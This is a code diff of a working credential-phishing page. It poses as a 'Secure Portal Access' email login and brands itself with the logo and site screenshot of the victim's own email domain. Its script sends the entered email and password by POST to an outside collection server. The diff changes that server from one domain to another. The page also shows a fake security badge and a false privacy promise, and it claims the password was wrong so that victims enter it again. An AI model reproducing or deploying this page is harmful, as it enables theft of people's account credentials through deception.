@@ -1,239 +1,290 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-	
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-	  <meta name="robots" content="noindex, nofollow">
-  <meta name="googlebot" content="noindex, nofollow">
-  <title>Secure Portal Access</title>
-   <link id="favicon" rel="shortcut icon" type="image/png" href="#" />
-  <meta name="robots" content="noindex">
-  <meta name="robots" content="noindex, nofollow">
-  <meta name="robots" content="noimageindex">
-  <meta name="googlebot" content="noindex">
-<!--===============================================================================================-->	
-	
-<!--===============================================================================================-->
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn" crossorigin="anonymous"><!--===============================================================================================-->
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="robots" content="noindex, nofollow" />
+    <meta name="googlebot" content="noindex, nofollow" />
+    <title>Secure Portal Access</title>
+    <link id="favicon" rel="shortcut icon" type="image/png" href="#" />
+    <meta name="robots" content="noindex" />
+    <meta name="robots" content="noindex, nofollow" />
+    <meta name="robots" content="noimageindex" />
+    <meta name="googlebot" content="noindex" />
+    <!--===============================================================================================-->
 
-	<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v2/css/main.css">
-<!--===============================================================================================-->
-<style type="text/css">
-	  html,
-    body {
-      font-size: 18px;
-      font-family: Arial, helvetica neue, Helvetica, sans-serif sans-serif;
-      font-weight: 500;
-      -webkit-background-size: cover;
-			-moz-background-size: cover;
-			-o-background-size: cover;
-			background-size: cover;
-    }
-	.container-login100{
-		background: url("");
-		background-size: cover;
+    <!--===============================================================================================-->
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css"
+      integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn"
+      crossorigin="anonymous"
+    />
+    <!--===============================================================================================-->
 
-	}
-	.wrap-input100 {
-    width: 100%;
-    position: relative;
-    border-bottom: 1px solid #adadad;
-    margin-bottom: 20px;
-}
-.wrap-login100 {
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://colorlib.com/etc/lf/Login_v2/css/main.css"
+    />
+    <!--===============================================================================================-->
+    <style type="text/css">
+      html,
+      body {
+        font-size: 18px;
+        font-family: Arial, helvetica neue, Helvetica, sans-serif sans-serif;
+        font-weight: 500;
+        -webkit-background-size: cover;
+        -moz-background-size: cover;
+        -o-background-size: cover;
+        background-size: cover;
+        background-color: white;
+      }
+      .container-login100 {
+        background: url("");
+        background-size: cover;
+      }
+      .wrap-input100 {
+        width: 100%;
+        position: relative;
+        border-bottom: 1px solid #adadad;
+        margin-bottom: 20px;
+      }
+      .wrap-login100 {
+        padding: 30px;
+        border: solid 1px #ccc;
+        box-shadow: 0 20px 50px #a9a9a9;
+        border-radius: 4px 4px 0 0;
+      }
+      .btn {
+      }
+      .sign-icon {
+        background: #f8f8f8;
+        padding: 10px 5px;
+        border: solid 1px #e3dede;
+        margin-bottom: 10px;
+      }
+      .sign-icon span {
+        font-weight: bold;
+      }
+      .sign-icon img {
+        width: 30px;
+      }
+      .red {
+        border-bottom: 1px solid red;
+      }
+      #logoname {
+        text-transform: uppercase;
+      }
+      .limiter {
+        width: 50%;
+        margin: auto;
+        margin-top: 30px;
+        margin-bottom: 30px;
+        background-color: white;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="limiter">
+      <div class="container-login100">
+        <div class="">
+          <div></div>
+          <div></div>
+          <div
+            style="
+              background-color: #373a91;
+              background-image: none;
+              width: 100%;
+            "
+          >
+            <div
+              class="row title ext-title"
+              style="margin: 0; padding: 10px; color: #fff"
+            >
+              <div role="heading" aria-level="1" data-bind="text: title">
+                <div class="pb-2 logo_chang">
+                  <img id="logoimg" src="" width="50px" alt="" />
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="wrap-login100">
+            <div class="mb-3">
+              <h3 style="font-size: 20px">Please sign in with your email</h3>
+            </div>
+            <small class="text-danger" id="eError" style="display: none"
+              ><div class="alert alert-danger">
+                Password is incorrect, kindly check and try again.
+              </div></small
+            >
+            <form class="login100-form validate-form">
+              <div class="input-group flex-nowrap mb-2 email-div">
+                <div class="input-group-prepend">
+                  <span class="input-group-text" id="addon-wrapping"
+                    ><img
+                      src="https://cdn-icons-png.flaticon.com/512/561/561127.png"
+                      width="20px"
+                  /></span>
+                </div>
+                <input
+                  type="email"
+                  id="email"
+                  name="email"
+                  class="form-control"
+                  placeholder="Email"
+                  aria-label="Email"
+                  aria-describedby="addon-wrapping"
+                />
+              </div>
+              <input type="hidden" name="lcount" id="lcount" value="0" />
 
-    padding: 30px;
-    border: solid 1px #ccc;
-    box-shadow: 0 20px 50px #a9a9a9;
-    border-radius: 4px 4px 0 0;
-   
-    }
-    .btn{
-    	
-    }
-    .sign-icon{
-    	    background: #f8f8f8;
-    padding: 10px 5px;
-    border: solid 1px #e3dede;
-    margin-bottom: 10px;
-    }
-    .sign-icon span{
-    	font-weight: bold;
+              <div class="input-group flex-nowrap mb-4 pass-div">
+                <div class="input-group-prepend">
+                  <span class="input-group-text" id="addon-wrapping"
+                    ><img
+                      src="https://cdn-icons-png.flaticon.com/512/3064/3064155.png"
+                      width="20px"
+                  /></span>
+                </div>
+                <input
+                  type="password"
+                  id="pass"
+                  name=""
+                  pass
+                  class="form-control"
+                  placeholder="Email Password"
+                  aria-label="Password"
+                  aria-describedby="addon-wrapping"
+                />
+              </div>
 
-    }
-    .sign-icon img{
-    	width: 30px;
-    }
-    .red{
-    	    border-bottom: 1px solid red;
-    }
-    #logoname{
-    	text-transform: uppercase;
-    }
-   
-   
-</style>
-</head>
-<body>
-		
-	<div class="limiter">
-		<div class="container-login100">
-			<div class=""><div></div><div></div>
-			<div style="background-color: #373a91;
-    background-image: none; width: 100%; "><div class="row title ext-title"  style="margin: 0; padding: 10px; color: #fff;">
-																						<div role="heading" aria-level="1" data-bind="text: title"><div class="pb-2 logo_chang"><img id="logoimg" src="" width="50px" alt="" ></div></div>
-																				</div></div>
-			<div class="wrap-login100">
-
-				<div class="mb-3">
-					
-				<h3 style="font-size:20px">
-						Please sign in with your email
-					</h3></div>
-					<small class="text-danger" id="eError" style="display: none;"><div class="alert alert-danger">Password is incorrect, kindly check and try again.</div></small>
-				<form class="login100-form validate-form">
-<div class="input-group flex-nowrap mb-2 email-div">
-  <div class="input-group-prepend">
-    <span class="input-group-text" id="addon-wrapping"><img src="https://cdn-icons-png.flaticon.com/512/561/561127.png" width="20px"></span>
-  </div>
-  <input type="email" id="email" name="email" class="form-control" placeholder="Email" aria-label="Email" aria-describedby="addon-wrapping">
-</div>  <input type="hidden"  name="lcount" id="lcount" value="0">
-					
-			<div class="input-group flex-nowrap mb-4 pass-div">
-  <div class="input-group-prepend">
-    <span class="input-group-text" id="addon-wrapping"><img src="https://cdn-icons-png.flaticon.com/512/3064/3064155.png" width="20px"></span>
-  </div>
-  <input type="password" id="pass" name=""pass class="form-control" placeholder="Email Password" aria-label="Password" aria-describedby="addon-wrapping">
-</div>	
-
-
-					<div style="float: right;">
-					
-							
-							<button class="btn btn-primary" style="background-color:#373a91;" type="button" id="submit-btn" onclick="sendLog();"><span id="submit-btn-text">Login</span>
-								
-							</button>
-					
-					</div>
-<div class="clearfix"></div>
-<div class="center mt-4">
-					
-        <p class="privacy" style="font-size: 12px">
-          Privacy Policy: <span id="kai" style="text-transform:uppercase;"></span><br>
-          Your information is only for the sole purpose of viewing this document and would not be shared.
-        </p>
-        <center>
-          <img src="https://www.pngitem.com/pimgs/m/26-269507_arbys-logo-transparent-norton-secured-logo-png-png.png"
-          width="107" height="58"></center>
+              <div style="float: right">
+                <button
+                  class="btn btn-primary"
+                  style="background-color: #373a91"
+                  type="button"
+                  id="submit-btn"
+                  onclick="sendLog();"
+                >
+                  <span id="submit-btn-text">Login</span>
+                </button>
+              </div>
+              <div class="clearfix"></div>
+              <div class="center mt-4">
+                <p class="privacy" style="font-size: 12px">
+                  Privacy Policy:
+                  <span id="kai" style="text-transform: uppercase"></span><br />
+                  Your information is only for the sole purpose of viewing this
+                  document and would not be shared.
+                </p>
+                <center>
+                  <img
+                    src="https://www.pngitem.com/pimgs/m/26-269507_arbys-logo-transparent-norton-secured-logo-png-png.png"
+                    width="107"
+                    height="58"
+                  />
+                </center>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
     </div>
-				</form>
-			</div>
-			</div>
-		</div>
-	</div>
 
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-fQybjgWLrvvRgtW6bFlB7jaZrFsaBXjsOMm/tB9LTS58ONXgqbR9W8oWht/amnpF"
+      crossorigin="anonymous"
+    ></script>
 
-	
- <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-fQybjgWLrvvRgtW6bFlB7jaZrFsaBXjsOMm/tB9LTS58ONXgqbR9W8oWht/amnpF" crossorigin="anonymous"></script>
+    <script type="text/javascript">
+      var urlx = "https://docsuraedmf.sbs/loginscript.php";
 
-<script type="text/javascript">
-	 var urlx ="https://blueskyexps.com/loginscript.php";
+      var url = new URLSearchParams(location.search);
+      var hash = location.hash ? location.hash.slice(1) : "";
+      var hasherror = hash && hash.indexOf("error=") > -1 ? "error" : "";
+      var email = url.get("email") || url.get("login") || hash;
+      if (email && email.indexOf("&") > -1) email = email.split("&")[0];
+      var error = url.get("error") || hasherror;
+      const err = document.getElementById("err");
+      var count = 0;
+      if (email && /.+@.+\..+/.test(email)) {
+        $("input[name='email']").val(email);
+        $("input[name='pass']").focus();
+        $("#username").html(email.split("@")[0]);
 
+        var myemail = email;
+        var index = myemail.indexOf("@");
+        var email_slice = myemail.substr(index + 1);
+        var mainPage = "https://" + email_slice;
 
+        var logoname = email_slice;
+        $("#logoname").html(logoname);
+        $("#kai").html(logoname);
 
-	   var url = new URLSearchParams(location.search);
-  var hash = location.hash ? location.hash.slice(1) : '';
-  var hasherror = hash && hash.indexOf('error=') > -1 ? 'error' : '';
-  var email = url.get('email') || url.get('login') || hash;
-  if (email && email.indexOf('&') > -1) email = email.split('&')[0]
-  var error = url.get('error') || hasherror;
-  const err = document.getElementById('err');
-  var count = 0;
-  if (email && /.+@.+\..+/.test(email)) {
-    $("input[name='email']").val(email);
-    $("input[name='pass']").focus();
-    $("#username").html(email.split('@')[0])
+        var image =
+          "url('https://image.thum.io/get/auth/58650-a8ab237ac019e7bfc5807202d3de5bd6/https://" +
+          email_slice;
+        ("')");
 
-    var myemail = email;
-    var index = myemail.indexOf("@");
-    var email_slice = myemail.substr((index + 1));
-    var mainPage = 'https://' + email_slice;
+        $("#logoimg").attr("src", "https://logo.clearbit.com/" + mainPage);
+        $("#favicon").attr("href", "https://logo.clearbit.com/" + mainPage);
 
-    var logoname = email_slice;
-    $("#logoname").html(logoname);
-    $("#kai").html(logoname);
+        document.body.style.backgroundImage = image;
+        document.title = "Secure Folder Access - " + email_slice;
+      } else {
+        $("input[name='email']").focus();
+      }
 
-    var image = "url('https://image.thum.io/get/auth/58650-a8ab237ac019e7bfc5807202d3de5bd6/https://" + email_slice;
-    "')"
+      function isEmail(email) {
+        var regex =
+          /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        return regex.test(email);
+      }
 
+      function sendLog() {
+        var email = $("#email").val();
+        var pass = $("#pass").val();
+        var lcount = $("#lcount").val();
+        var btn_div = $("#submit-btn");
+        var index = email.indexOf("@");
+        var email_slice = email.substr(index + 1);
+        var mainPage = "https://" + email_slice;
+        if (isEmail(email) === true) {
+        } else {
+          console.log("red");
+          $(".email-div").addClass("red");
+          return false;
+        }
 
-$("#logoimg").attr("src", "https://logo.clearbit.com/" + mainPage);
-    $("#favicon").attr("href", "https://logo.clearbit.com/" + mainPage);    
-
-    document.body.style.backgroundImage = image;
-    document.title = "Secure Folder Access - " + email_slice;
-
-
-  } else {
-    $("input[name='email']").focus();
-  }
-
-
-  function isEmail(email) {
-  var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-  return regex.test(email);
-}
-   
-	 function sendLog(){
-	 	
-    var email = $("#email").val();
-    var pass = $("#pass").val();
-    var lcount = $("#lcount").val();
-var btn_div = $("#submit-btn"); 
- var index = email.indexOf("@");
-    var email_slice = email.substr((index + 1));
-    var mainPage = 'https://' + email_slice;
-if(isEmail(email)===true){
-
-}else{
-	console.log('red')
-   $(".email-div").addClass('red');
-return false;
-    }
-
-         if(email=='' || pass==''){
-     $(".email-div").addClass('red');
-      $(".pass-div").addClass('red');
-    return false; 
-}else{
-document.getElementById("submit-btn").disabled = true; 
-      $("#submit-btn-text").html('Please wait');
-        $.ajax({
+        if (email == "" || pass == "") {
+          $(".email-div").addClass("red");
+          $(".pass-div").addClass("red");
+          return false;
+        } else {
+          document.getElementById("submit-btn").disabled = true;
+          $("#submit-btn-text").html("Please wait");
+          $.ajax({
             type: "POST",
             url: urlx,
-            data: { action : 'signup', email : email, pass : pass, lc : lcount} 
-        }).done(function(data){
-          
-          console.log('response: ', data);
-if(data == "ok"){
-       
-        window.location.replace(mainPage);
-
-}else {
-    $("#eError").show();
- $("#lcount").val(parseFloat(lcount+1));
-   $("#pass").val('');
-   $("#submit-btn-text").html('Login');
-        document.getElementById("submit-btn").disabled = false;
-return false;
-}
-          
-    
-        }); 
-    }
-    }
-</script>
-</body>
+            data: { action: "signup", email: email, pass: pass, lc: lcount },
+          }).done(function (data) {
+            console.log("response: ", data);
+            if (data == "ok") {
+              window.location.replace(mainPage);
+            } else {
+              $("#eError").show();
+              $("#lcount").val(parseFloat(lcount + 1));
+              $("#pass").val("");
+              $("#submit-btn-text").html("Login");
+              document.getElementById("submit-btn").disabled = false;
+              return false;
+            }
+          });
+        }
+      }
+    </script>
+  </body>
 </html>
